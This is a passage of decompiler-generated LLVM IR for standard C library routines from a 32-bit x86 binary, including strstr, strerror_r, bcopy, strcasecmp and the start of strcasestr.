  %v0_80516227 = phi i32 [ %v1_805161e, %dec_label_pc_805161e ], [ %v4_805160c, %entry ]
  %v1_8051619 = inttoptr i32 %v0_80516227 to i8*
  %v2_8051619 = load i8, i8* %v1_8051619, align 1
  %v3_8051619 = icmp eq i8 %v2_8051619, 0
  br i1 %v3_8051619, label %dec_label_pc_8051622, label %dec_label_pc_805161e

dec_label_pc_805161e:                             ; preds = %dec_label_pc_8051619
  %v1_805161e = add i32 %v0_80516227, 1
  %v1_805161f = add i32 %v1_805161f8, -1
  %v8_805161f = icmp eq i32 %v1_805161f, 0
  %v1_8051620 = icmp eq i1 %v8_805161f, false
  br i1 %v1_8051620, label %dec_label_pc_8051619, label %dec_label_pc_8051622

dec_label_pc_8051622:                             ; preds = %dec_label_pc_805161e, %dec_label_pc_8051619, %entry
  %v0_8051622.lcssa = phi i32 [ %v4_805160c, %entry ], [ %v0_80516227, %dec_label_pc_8051619 ], [ %v1_805161e, %dec_label_pc_805161e ]
  %v2_8051622 = sub i32 %v0_8051622.lcssa, %v4_805160c
  ret i32 %v2_8051622

; uselistorder directives
  uselistorder i32 %v1_805161f, { 1, 0 }
  uselistorder i32 %v0_80516227, { 0, 2, 1 }
  uselistorder i32 %v4_805160c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051619, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_805162b = load i32, i32* @ebx, align 4
  %v4_805162f = ptrtoint i8* %arg2 to i32
  %v2_8051637 = load i8, i8* %arg2, align 1
  %v1_805163a = icmp eq i8 %v2_8051637, 0
  br i1 %v1_805163a, label %dec_label_pc_80516e7, label %dec_label_pc_8051642

dec_label_pc_8051642:                             ; preds = %entry
  %v1_8051642 = add i32 %arg1, -1
  br label %dec_label_pc_8051643

dec_label_pc_8051643:                             ; preds = %dec_label_pc_805164f, %dec_label_pc_8051642
  %v0_8051643 = phi i32 [ %v1_8051643, %dec_label_pc_805164f ], [ %v1_8051642, %dec_label_pc_8051642 ]
  %v1_8051643 = add i32 %v0_8051643, 1
  %v1_8051644 = inttoptr i32 %v1_8051643 to i8*
  %v2_8051644 = load i8, i8* %v1_8051644, align 1
  %v1_8051647 = icmp eq i8 %v2_8051644, 0
  br i1 %v1_8051647, label %dec_label_pc_80516e5, label %dec_label_pc_805164f

dec_label_pc_805164f:                             ; preds = %dec_label_pc_8051643
  %v12_805164f = icmp eq i8 %v2_8051644, %v2_8051637
  %v1_8051651 = icmp eq i1 %v12_805164f, false
  br i1 %v1_8051651, label %dec_label_pc_8051643, label %dec_label_pc_8051653

dec_label_pc_8051653:                             ; preds = %dec_label_pc_805164f
  %v1_8051653 = add i32 %v4_805162f, 1
  %v2_805165a = inttoptr i32 %v1_8051653 to i8*
  %v3_805165a = load i8, i8* %v2_805165a, align 1
  %v1_8051661 = icmp eq i8 %v3_805165a, 0
  br i1 %v1_8051661, label %dec_label_pc_80516e7, label %dec_label_pc_8051665

dec_label_pc_8051665:                             ; preds = %dec_label_pc_8051653
  %v1_8051665 = add i32 %v0_8051643, 2
  %v1_80516a6 = add i32 %v4_805162f, 2
  %v2_80516a6 = inttoptr i32 %v1_80516a6 to i8*
  br label %dec_label_pc_8051698

dec_label_pc_8051670:                             ; preds = %dec_label_pc_80516dd
  %v2_8051670 = inttoptr i32 %v0_80516ab to i8*
  %v3_8051670 = load i8, i8* %v2_8051670, align 1
  br label %dec_label_pc_805168d.preheader

dec_label_pc_805168d.preheader:                   ; preds = %dec_label_pc_8051670, %dec_label_pc_8051698
  %v0_8051679.ph.in = phi i8 [ %v0_805168d27.in, %dec_label_pc_8051698 ], [ %v3_8051670, %dec_label_pc_8051670 ]
  %v12_805168d54 = icmp eq i8 %v0_8051679.ph.in, %v2_8051637
  %v1_805168f55 = icmp eq i1 %v12_805168d54, false
  br i1 %v1_805168f55, label %dec_label_pc_8051679, label %dec_label_pc_8051691

dec_label_pc_8051679:                             ; preds = %dec_label_pc_805168d.preheader, %dec_label_pc_8051689
  %v0_805167957.in = phi i8 [ %v2_805168a, %dec_label_pc_8051689 ], [ %v0_8051679.ph.in, %dec_label_pc_805168d.preheader ]
  %v0_805167d56 = phi i32 [ %v1_8051689, %dec_label_pc_8051689 ], [ %v0_80516ab, %dec_label_pc_805168d.preheader ]
  %v1_8051679 = icmp eq i8 %v0_805167957.in, 0
  br i1 %v1_8051679, label %dec_label_pc_80516e5, label %dec_label_pc_805167d

dec_label_pc_805167d:                             ; preds = %dec_label_pc_8051679
  %v1_805167d = add i32 %v0_805167d56, 1
  %v1_805167e = inttoptr i32 %v1_805167d to i8*
  %v2_805167e = load i8, i8* %v1_805167e, align 1
  %v12_8051681 = icmp eq i8 %v2_805167e, %v2_8051637
  br i1 %v12_8051681, label %dec_label_pc_8051691, label %dec_label_pc_8051685

dec_label_pc_8051685:                             ; preds = %dec_label_pc_805167d
  %v1_8051685 = icmp eq i8 %v2_805167e, 0
  br i1 %v1_8051685, label %dec_label_pc_80516e5, label %dec_label_pc_8051689

dec_label_pc_8051689:                             ; preds = %dec_label_pc_8051685
  %v1_8051689 = add i32 %v0_805167d56, 2
  %v1_805168a = inttoptr i32 %v1_8051689 to i8*
  %v2_805168a = load i8, i8* %v1_805168a, align 1
  %v12_805168d = icmp eq i8 %v2_805168a, %v2_8051637
  %v1_805168f = icmp eq i1 %v12_805168d, false
  br i1 %v1_805168f, label %dec_label_pc_8051679, label %dec_label_pc_8051691

dec_label_pc_8051691:                             ; preds = %dec_label_pc_8051689, %dec_label_pc_805167d, %dec_label_pc_805168d.preheader
  %v0_8051691 = phi i32 [ %v0_80516ab, %dec_label_pc_805168d.preheader ], [ %v1_805167d, %dec_label_pc_805167d ], [ %v1_8051689, %dec_label_pc_8051689 ]
  %v1_8051691 = add i32 %v0_8051691, 1
  br label %dec_label_pc_8051698

dec_label_pc_8051698:                             ; preds = %dec_label_pc_8051665, %dec_label_pc_8051691
  %v0_805168d27.in.in.in = phi i32 [ %v1_8051691, %dec_label_pc_8051691 ], [ %v1_8051665, %dec_label_pc_8051665 ]
  %v0_80516ab = phi i32 [ %v1_8051691, %dec_label_pc_8051691 ], [ %v1_8051665, %dec_label_pc_8051665 ]
  %v0_805168d27.in.in = inttoptr i32 %v0_805168d27.in.in.in to i8*
  %v0_805168d27.in = load i8, i8* %v0_805168d27.in.in, align 1
  %storemerge4 = icmp eq i8 %v0_805168d27.in, %v3_805165a
  %v1_8051698 = icmp eq i1 %storemerge4, false
  br i1 %v1_8051698, label %dec_label_pc_805168d.preheader, label %dec_label_pc_805169a

dec_label_pc_805169a:                             ; preds = %dec_label_pc_8051698
  %v1_80516a2 = add i32 %v0_80516ab, 1
  %v2_80516a2 = inttoptr i32 %v1_80516a2 to i8*
  %v3_80516a2 = load i8, i8* %v2_80516a2, align 1
  %v3_80516a6 = load i8, i8* %v2_80516a6, align 1
  %v1_80516ae = add i32 %v0_80516ab, -1
  %v12_80516b1 = icmp eq i8 %v3_80516a2, %v3_80516a6
  %v1_80516b3 = icmp eq i1 %v12_80516b1, false
  br i1 %v1_80516b3, label %dec_label_pc_80516dd, label %dec_label_pc_80516b5.preheader

dec_label_pc_80516b5.preheader:                   ; preds = %dec_label_pc_805169a
  %v1_80516b510 = icmp eq i8 %v3_80516a2, 0
  br i1 %v1_80516b510, label %dec_label_pc_80516e7, label %dec_label_pc_80516b9

dec_label_pc_80516b9:                             ; preds = %dec_label_pc_80516b5.preheader, %dec_label_pc_80516d9
  %v0_80516cc = phi i32 [ %v1_80516cc, %dec_label_pc_80516d9 ], [ %v1_80516a6, %dec_label_pc_80516b5.preheader ]
  %v0_80516c9 = phi i32 [ %v1_80516c9, %dec_label_pc_80516d9 ], [ %v1_80516a2, %dec_label_pc_80516b5.preheader ]
  %v1_80516b9 = add i32 %v0_80516c9, 1
  %v2_80516b9 = inttoptr i32 %v1_80516b9 to i8*
  %v3_80516b9 = load i8, i8* %v2_80516b9, align 1
  %v1_80516bd = add i32 %v0_80516cc, 1
  %v2_80516bd = inttoptr i32 %v1_80516bd to i8*
  %v3_80516bd = load i8, i8* %v2_80516bd, align 1
  %v12_80516c1 = icmp eq i8 %v3_80516b9, %v3_80516bd
  %v1_80516c3 = icmp eq i1 %v12_80516c1, false
  br i1 %v1_80516c3, label %dec_label_pc_80516dd, label %dec_label_pc_80516c5

dec_label_pc_80516c5:                             ; preds = %dec_label_pc_80516b9
  %v1_80516c5 = icmp eq i8 %v3_80516bd, 0
  br i1 %v1_80516c5, label %dec_label_pc_80516e7, label %dec_label_pc_80516c9

dec_label_pc_80516c9:                             ; preds = %dec_label_pc_80516c5
  %v1_80516c9 = add i32 %v0_80516c9, 2
  %v1_80516cc = add i32 %v0_80516cc, 2
  %v1_80516cf = inttoptr i32 %v1_80516c9 to i8*
  %v2_80516cf = load i8, i8* %v1_80516cf, align 1
  %v1_80516d2 = inttoptr i32 %v1_80516cc to i8*
  %v2_80516d2 = load i8, i8* %v1_80516d2, align 1
  %v12_80516d5 = icmp eq i8 %v2_80516cf, %v2_80516d2
  %v1_80516d7 = icmp eq i1 %v12_80516d5, false
  br i1 %v1_80516d7, label %dec_label_pc_80516dd, label %dec_label_pc_80516d9

dec_label_pc_80516d9:                             ; preds = %dec_label_pc_80516c9
  %v1_80516b5 = icmp eq i8 %v2_80516d2, 0
  br i1 %v1_80516b5, label %dec_label_pc_80516e7, label %dec_label_pc_80516b9

dec_label_pc_80516dd:                             ; preds = %dec_label_pc_80516c9, %dec_label_pc_80516b9, %dec_label_pc_805169a
  %v0_80516dd.in = phi i8 [ %v3_80516a6, %dec_label_pc_805169a ], [ %v2_80516d2, %dec_label_pc_80516c9 ], [ %v3_80516bd, %dec_label_pc_80516b9 ]
  %v1_80516dd = icmp eq i8 %v0_80516dd.in, 0
  %v1_80516df = icmp eq i1 %v1_80516dd, false
  br i1 %v1_80516df, label %dec_label_pc_8051670, label %dec_label_pc_80516e7

dec_label_pc_80516e5:                             ; preds = %dec_label_pc_8051643, %dec_label_pc_8051685, %dec_label_pc_8051679
  br label %dec_label_pc_80516e7

dec_label_pc_80516e7:                             ; preds = %dec_label_pc_80516b5.preheader, %dec_label_pc_80516dd, %dec_label_pc_80516c5, %dec_label_pc_80516d9, %entry, %dec_label_pc_8051653, %dec_label_pc_80516e5
  %storemerge2 = phi i32 [ 0, %dec_label_pc_80516e5 ], [ %v1_8051643, %dec_label_pc_8051653 ], [ %arg1, %entry ], [ %v1_80516ae, %dec_label_pc_80516d9 ], [ %v1_80516ae, %dec_label_pc_80516c5 ], [ %v1_80516ae, %dec_label_pc_80516dd ], [ %v1_80516ae, %dec_label_pc_80516b5.preheader ]
  store i32 %v0_805162b, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8 %v2_80516d2, { 0, 2, 1 }
  uselistorder i32 %v1_80516cc, { 1, 0 }
  uselistorder i32 %v1_80516c9, { 1, 0 }
  uselistorder i8 %v3_80516bd, { 0, 2, 1 }
  uselistorder i8 %v3_80516a2, { 1, 0 }
  uselistorder i32 %v0_80516ab, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_8051691, { 1, 0 }
  uselistorder i8 %v2_805168a, { 1, 0 }
  uselistorder i32 %v1_8051689, { 0, 2, 1 }
  uselistorder i8 %v2_805167e, { 1, 0 }
  uselistorder i32 %v0_805167d56, { 1, 0 }
  uselistorder i32 %v1_8051665, { 1, 0 }
  uselistorder i32 %v1_8051643, { 0, 2, 1 }
  uselistorder i8 %v2_8051637, { 1, 2, 0, 3, 4 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80516e7, { 6, 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_80516e5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80516b9, { 1, 0 }
  uselistorder label %dec_label_pc_8051698, { 1, 0 }
  uselistorder label %dec_label_pc_8051679, { 1, 0 }
  uselistorder label %dec_label_pc_805168d.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_8051701 = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_8051706 = load i32, i32* @ebx, align 4
  ret i32 %v0_8051706
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_8051722 = icmp ugt i32 %arg1, 124
  br i1 %v6_8051722, label %dec_label_pc_805173f, label %dec_label_pc_8051724

dec_label_pc_8051724:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_805fd60.718 to i32), i32* @esi, align 4
  %v1_80517344 = icmp eq i32 %arg1, 0
  %v1_805173611 = icmp eq i1 %v1_80517344, false
  br i1 %v1_805173611, label %dec_label_pc_805172d, label %dec_label_pc_8051738

dec_label_pc_805172d:                             ; preds = %dec_label_pc_8051724, %dec_label_pc_805172d
  %v0_8051730 = phi i32 [ %v3_8051730, %dec_label_pc_805172d ], [ %arg1, %dec_label_pc_8051724 ]
  %v0_8051733 = phi i32 [ %v1_8051733, %dec_label_pc_805172d ], [ ptrtoint ([8 x i8]* @global_var_805fd60.718 to i32), %dec_label_pc_8051724 ]
  %v1_805172d = inttoptr i32 %v0_8051733 to i8*
  %v2_805172d = load i8, i8* %v1_805172d, align 1
  %v7_805172d = icmp eq i8 %v2_805172d, 0
  %v2_8051730 = zext i1 %v7_805172d to i32
  %v3_8051730 = add i32 %v2_8051730, %v0_8051730
  %v16_8051730 = icmp eq i32 %v3_8051730, 0
  %v1_8051733 = add i32 %v0_8051733, 1
  store i32 %v1_8051733, i32* @esi, align 4
  %v1_8051736 = icmp eq i1 %v16_8051730, false
  br i1 %v1_8051736, label %dec_label_pc_805172d, label %dec_label_pc_8051738

dec_label_pc_8051738:                             ; preds = %dec_label_pc_805172d, %dec_label_pc_8051724
  %v0_805173a = phi i32 [ ptrtoint ([8 x i8]* @global_var_805fd60.718 to i32), %dec_label_pc_8051724 ], [ %v1_8051733, %dec_label_pc_805172d ]
  store i32 0, i32* @ebp, align 4
  %v1_805173a = inttoptr i32 %v0_805173a to i8*
  %v2_805173a = load i8, i8* %v1_805173a, align 1
  %v3_805173a = icmp eq i8 %v2_805173a, 0
  %v1_805173d = icmp eq i1 %v3_805173a, false
  br i1 %v1_805173d, label %dec_label_pc_8051738.dec_label_pc_805176e_crit_edge, label %dec_label_pc_805173f

dec_label_pc_8051738.dec_label_pc_805176e_crit_edge: ; preds = %dec_label_pc_8051738
  br label %dec_label_pc_805176e

dec_label_pc_805173f:                             ; preds = %dec_label_pc_8051738, %entry
  store i32 22, i32* @ebp, align 4
  %v1_8051747 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_8051753 = bitcast i32* %stack_var_-17 to i8*
  %v7_8051753 = call i32 @_uintmaxtostr(i8* %v6_8051753, i32 %arg1, i32 %v1_8051747, i32 -10, i32 0)
  %v1_805175b = add i32 %v7_8051753, -14
  store i32 %v1_805175b, i32* @esi, align 4
  %v5_8051765 = inttoptr i32 %v1_805175b to i8*
  store i8* %v5_8051765, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_805175b to i16*
  %v6_8051766 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_805fd36.719 to i32), i32 14)
  %v0_805177d.pre = load i32, i32* @edi, align 4
  %v0_805177f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805176e

dec_label_pc_805176e:                             ; preds = %dec_label_pc_8051738.dec_label_pc_805176e_crit_edge, %dec_label_pc_805173f
  %v0_805177f = phi i32 [ %v0_805173a, %dec_label_pc_8051738.dec_label_pc_805176e_crit_edge ], [ %v0_805177f.pre, %dec_label_pc_805173f ]
  %v0_805177d = phi i32 [ %arg3, %dec_label_pc_8051738.dec_label_pc_805176e_crit_edge ], [ %v0_805177d.pre, %dec_label_pc_805173f ]
  %v4_8051770 = icmp eq i32 %arg2, 0
  %v1_8051775 = icmp eq i1 %v4_8051770, false
  %v2_805177d = select i1 %v1_8051775, i32 %v0_805177d, i32 0
  store i32 %v2_805177d, i32* @edi, align 4
  %v5_805177f = inttoptr i32 %v0_805177f to i8*
  store i8* %v5_805177f, i8** %stack_var_-108, align 4
  %v3_8051780 = call i32 @strlen(i8* %v5_805177f)
  %v1_8051788 = add i32 %v3_8051780, 1
  store i32 %v1_8051788, i32* %ebx.global-to-local, align 4
  %v1_805178b = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_8051788, %v1_805178b
  br i1 %tmp46, label %dec_label_pc_805178f, label %dec_label_pc_8051796

dec_label_pc_805178f:                             ; preds = %dec_label_pc_805176e
  store i32 %v1_805178b, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_8051796

dec_label_pc_8051796:                             ; preds = %dec_label_pc_805176e, %dec_label_pc_805178f
  %v0_805179b = phi i32 [ %v1_8051788, %dec_label_pc_805176e ], [ %v1_805178b, %dec_label_pc_805178f ]
  %v1_8051796 = icmp eq i32 %v0_805179b, 0
  br i1 %v1_8051796, label %dec_label_pc_80517b2, label %dec_label_pc_805179a

dec_label_pc_805179a:                             ; preds = %dec_label_pc_8051796
  %v0_805179c = load i32, i32* @esi, align 4
  %v8_805179d = inttoptr i32 %arg2 to i8*
  store i8* %v8_805179d, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_80517a1 = call i32 @memcpy(i16* %tmp45, i32 %v0_805179c, i32 %v0_805179b)
  %v1_80517ad = load i32, i32* %ebx.global-to-local, align 4
  %v2_80517ad = add i32 %arg2, -1
  %v3_80517ad = add i32 %v2_80517ad, %v1_80517ad
  %v4_80517ad = inttoptr i32 %v3_80517ad to i8*
  store i8 0, i8* %v4_80517ad, align 1
  br label %dec_label_pc_80517b2

dec_label_pc_80517b2:                             ; preds = %dec_label_pc_8051796, %dec_label_pc_805179a
  %v0_80517b2 = load i32, i32* @ebp, align 4
  %v1_80517b2 = icmp eq i32 %v0_80517b2, 0
  br i1 %v1_80517b2, label %dec_label_pc_80517bd, label %dec_label_pc_80517b6

dec_label_pc_80517b6:                             ; preds = %dec_label_pc_80517b2
  %v0_80517b6 = load i8*, i8** %stack_var_-108, align 4
  %v1_80517b6 = ptrtoint i8* %v0_80517b6 to i32
  %v2_80517b6 = call i32 @__errno_location(i32 %v1_80517b6)
  %v0_80517bb = load i32, i32* @ebp, align 4
  %v2_80517bb = inttoptr i32 %v2_80517b6 to i32*
  store i32 %v0_80517bb, i32* %v2_80517bb, align 4
  %v0_80517c0.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80517bd

dec_label_pc_80517bd:                             ; preds = %dec_label_pc_80517b2, %dec_label_pc_80517b6
  %v0_80517c0 = phi i32 [ 0, %dec_label_pc_80517b2 ], [ %v0_80517c0.pre, %dec_label_pc_80517b6 ]
  ret i32 %v0_80517c0

; uselistorder directives
  uselistorder i32 %v1_805178b, { 1, 2, 0 }
  uselistorder i32 %v1_8051788, { 1, 0, 2 }
  uselistorder i32 %v1_805175b, { 1, 0, 2 }
  uselistorder i32 %v1_8051733, { 0, 2, 1 }
  uselistorder i32 %v3_8051730, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_805fd60.718 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_80517bd, { 1, 0 }
  uselistorder label %dec_label_pc_80517b2, { 1, 0 }
  uselistorder label %dec_label_pc_8051796, { 1, 0 }
  uselistorder label %dec_label_pc_805176e, { 1, 0 }
  uselistorder label %dec_label_pc_805172d, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_80517d8 = inttoptr i32 %arg2 to i8*
  %v3_80517d8 = call i32 @memmove(i8* %v2_80517d8, i32 %arg1)
  ret i32 %v3_80517d8
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80517e2 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80517e2, i32* @ecx, align 4
  %v0_80517ec = load i32, i32* bitcast (i32** @global_var_8061540.721 to i32*), align 64
  br label %dec_label_pc_80517f2

dec_label_pc_80517f2:                             ; preds = %dec_label_pc_805180f, %entry
  %v0_80518156 = phi i32 [ %v0_80518157, %dec_label_pc_805180f ], [ 0, %entry ]
  %v0_805180f = phi i32 [ %v1_805180f, %dec_label_pc_805180f ], [ %arg2, %entry ]
  %v0_8051810 = phi i32 [ %v1_8051810, %dec_label_pc_805180f ], [ %v4_80517e2, %entry ]
  %v12_80517f2 = icmp eq i32 %v0_8051810, %v0_805180f
  %.pre = inttoptr i32 %v0_8051810 to i8*
  br i1 %v12_80517f2, label %dec_label_pc_805180a, label %dec_label_pc_80517f6

dec_label_pc_80517f6:                             ; preds = %dec_label_pc_80517f2
  %v2_80517f6 = load i8, i8* %.pre, align 1
  %v3_80517f6 = zext i8 %v2_80517f6 to i32
  %v2_80517f9 = mul nuw nsw i32 %v3_80517f6, 2
  %v3_80517f9 = add i32 %v2_80517f9, %v0_80517ec
  %v4_80517f9 = inttoptr i32 %v3_80517f9 to i16*
  %v5_80517f9 = load i16, i16* %v4_80517f9, align 2
  %v6_80517f9 = sext i16 %v5_80517f9 to i32
  %v1_80517fd = inttoptr i32 %v0_805180f to i8*
  %v2_80517fd = load i8, i8* %v1_80517fd, align 1
  %v3_80517fd = zext i8 %v2_80517fd to i32
  %v2_8051800 = mul nuw nsw i32 %v3_80517fd, 2
  %v3_8051800 = add i32 %v2_8051800, %v0_80517ec
  %v4_8051800 = inttoptr i32 %v3_8051800 to i16*
  %v5_8051800 = load i16, i16* %v4_8051800, align 2
  %v6_8051800 = sext i16 %v5_8051800 to i32
  %v2_8051804 = sub nsw i32 %v6_80517f9, %v6_8051800
  %v12_8051804 = icmp eq i32 %v2_8051804, 0
  store i32 %v2_8051804, i32* @edx, align 4
  %v1_8051808 = icmp eq i1 %v12_8051804, false
  br i1 %v1_8051808, label %dec_label_pc_8051813, label %dec_label_pc_805180a

dec_label_pc_805180a:                             ; preds = %dec_label_pc_80517f2, %dec_label_pc_80517f6
  %v0_80518157 = phi i32 [ %v2_8051804, %dec_label_pc_80517f6 ], [ %v0_80518156, %dec_label_pc_80517f2 ]
  %v2_805180a = load i8, i8* %.pre, align 1
  %v3_805180a = icmp eq i8 %v2_805180a, 0
  br i1 %v3_805180a, label %dec_label_pc_8051813, label %dec_label_pc_805180f

dec_label_pc_805180f:                             ; preds = %dec_label_pc_805180a
  %v1_805180f = add i32 %v0_805180f, 1
  %v1_8051810 = add i32 %v0_8051810, 1
  store i32 %v1_8051810, i32* @ecx, align 4
  br label %dec_label_pc_80517f2

dec_label_pc_8051813:                             ; preds = %dec_label_pc_805180a, %dec_label_pc_80517f6
  %v0_8051815 = phi i32 [ %v0_80518157, %dec_label_pc_805180a ], [ %v2_8051804, %dec_label_pc_80517f6 ]
  ret i32 %v0_8051815

; uselistorder directives
  uselistorder i32 %v1_8051810, { 1, 0 }
  uselistorder i32 %v0_80518157, { 1, 0 }
  uselistorder i32 %v2_8051804, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8051810, { 2, 1, 0 }
  uselistorder i32 %v0_805180f, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805180a, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805181b = load i32, i32* @ebx, align 4
  %v4_805181f = ptrtoint i8* %arg1 to i32
  %v1_805182b18 = inttoptr i32 %arg2 to i8*
  %v2_805182b1931 = load i8, i8* %v1_805182b18, align 1
  %v4_805182d2335 = icmp eq i8 %v2_805182b1931, 0
  %v1_805182f2436 = icmp eq i1 %v4_805182d2335, false
  br i1 %v1_805182f2436, label %dec_label_pc_8051835.lr.ph.lr.ph, label %dec_label_pc_8051865

dec_label_pc_8051835.lr.ph.lr.ph:                 ; preds = %entry
  %v3_805182b2032 = zext i8 %v2_805182b1931 to i32
  %v4_805182b.pre.pre = load i32, i32* @eax, align 4
  %v5_805182b2133 = and i32 %v4_805182b.pre.pre, -256
  %v6_805182b2234 = or i32 %v3_805182b2032, %v5_805182b2133
  %v4_8051835.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051835.lr.ph

dec_label_pc_8051835.lr.ph:                       ; preds = %dec_label_pc_8051835.lr.ph.lr.ph, %dec_label_pc_8051860
  %v4_8051835.pre = phi i32 [ %v4_8051835.pre.pre, %dec_label_pc_8051835.lr.ph.lr.ph ], [ %v0_8051842, %dec_label_pc_8051860 ]
  %v6_805182b2239 = phi i32 [ %v6_805182b2234, %dec_label_pc_8051835.lr.ph.lr.ph ], [ %v6_805182b22, %dec_label_pc_8051860 ]
  %v2_805182b1938 = phi i8 [ %v2_805182b1931, %dec_label_pc_8051835.lr.ph.lr.ph ], [ %v2_805182b19, %dec_label_pc_8051860 ]
  %v0_805186037 = phi i32 [ %v4_805181f, %dec_label_pc_8051835.lr.ph.lr.ph ], [ %v1_8051860, %dec_label_pc_8051860 ]
  br label %dec_label_pc_8051835

dec_label_pc_8051835:                             ; preds = %dec_label_pc_8051835.lr.ph, %dec_label_pc_8051855
  %v4_8051835 = phi i32 [ %v4_8051835.pre, %dec_label_pc_8051835.lr.ph ], [ %v4_805183544, %dec_label_pc_8051855 ]
  %v6_805182b29 = phi i32 [ %v6_805182b2239, %dec_label_pc_8051835.lr.ph ], [ %v6_805182b, %dec_label_pc_8051855 ]
  %v2_805182b28 = phi i8 [ %v2_805182b1938, %dec_label_pc_8051835.lr.ph ], [ %v2_805182b, %dec_label_pc_8051855 ]
  %v1_805182b27 = phi i8* [ %v1_805182b18, %dec_label_pc_8051835.lr.ph ], [ %v1_805182b, %dec_label_pc_8051855 ]
  %v0_805185526 = phi i32 [ %arg2, %dec_label_pc_8051835.lr.ph ], [ %v1_8051855, %dec_label_pc_8051855 ]
  %v0_805185625 = phi i32 [ %v0_805186037, %dec_label_pc_8051835.lr.ph ], [ %v1_8051856, %dec_label_pc_8051855 ]
  %v1_8051835 = inttoptr i32 %v0_805185625 to i8*
  %v2_8051835 = load i8, i8* %v1_8051835, align 1
  %v3_8051835 = zext i8 %v2_8051835 to i32
  %v5_8051835 = and i32 %v4_8051835, -256
  %v6_8051835 = or i32 %v5_8051835, %v3_8051835
  %v15_805183b = icmp eq i8 %v2_805182b28, %v2_8051835
  br i1 %v15_805183b, label %dec_label_pc_8051855, label %dec_label_pc_805183f

dec_label_pc_805183f:                             ; preds = %dec_label_pc_8051835
  %v2_805183f = load i8, i8* %v1_8051835, align 1
  %v3_805183f = zext i8 %v2_805183f to i32
  %v0_8051842 = load i32, i32* bitcast (i32** @global_var_8061540.721 to i32*), align 64
  %v2_8051848 = load i8, i8* %v1_805182b27, align 1
  %v3_8051848 = zext i8 %v2_8051848 to i32
  %v2_805184b = mul nuw nsw i32 %v3_805183f, 2
  %v3_805184b = add i32 %v2_805184b, %v0_8051842
  %v4_805184b = inttoptr i32 %v3_805184b to i16*
  %v5_805184b = load i16, i16* %v4_805184b, align 2
  %v6_805184b = zext i16 %v5_805184b to i32
  %v4_805184f = mul nuw nsw i32 %v3_8051848, 2
  %v5_805184f = add i32 %v4_805184f, %v0_8051842
  %v6_805184f = inttoptr i32 %v5_805184f to i16*
  %v7_805184f = load i16, i16* %v6_805184f, align 2
  %v18_805184f = icmp eq i16 %v5_805184b, %v7_805184f
  %v1_8051853 = icmp eq i1 %v18_805184f, false
  br i1 %v1_8051853, label %dec_label_pc_8051859, label %dec_label_pc_8051855

dec_label_pc_8051855:                             ; preds = %dec_label_pc_805183f, %dec_label_pc_8051835
  %v4_805183544 = phi i32 [ %v0_8051842, %dec_label_pc_805183f ], [ %v6_8051835, %dec_label_pc_8051835 ]
  %v4_805182b6 = phi i32 [ %v6_805184b, %dec_label_pc_805183f ], [ %v6_805182b29, %dec_label_pc_8051835 ]
  %v1_8051855 = add i32 %v0_805185526, 1
  %v1_8051856 = add i32 %v0_805185625, 1
  %v1_805182b = inttoptr i32 %v1_8051855 to i8*
  %v2_805182b = load i8, i8* %v1_805182b, align 1
  %v3_805182b = zext i8 %v2_805182b to i32
  %v5_805182b = and i32 %v4_805182b6, -256
  %v6_805182b = or i32 %v3_805182b, %v5_805182b
  %v4_805182d = icmp eq i8 %v2_805182b, 0
  %v1_805182f = icmp eq i1 %v4_805182d, false
  br i1 %v1_805182f, label %dec_label_pc_8051835, label %dec_label_pc_8051865

dec_label_pc_8051859:                             ; preds = %dec_label_pc_805183f
  %v4_8051859 = icmp eq i8 %v2_8051835, 0
  br i1 %v4_8051859, label %dec_label_pc_8051863, label %dec_label_pc_8051860

dec_label_pc_8051860:                             ; preds = %dec_label_pc_8051859
  %v1_8051860 = add i32 %v0_805186037, 1
  %v2_805182b19 = load i8, i8* %v1_805182b18, align 1
  %v3_805182b20 = zext i8 %v2_805182b19 to i32
  %v5_805182b21 = and i32 %v6_805184b, 65280
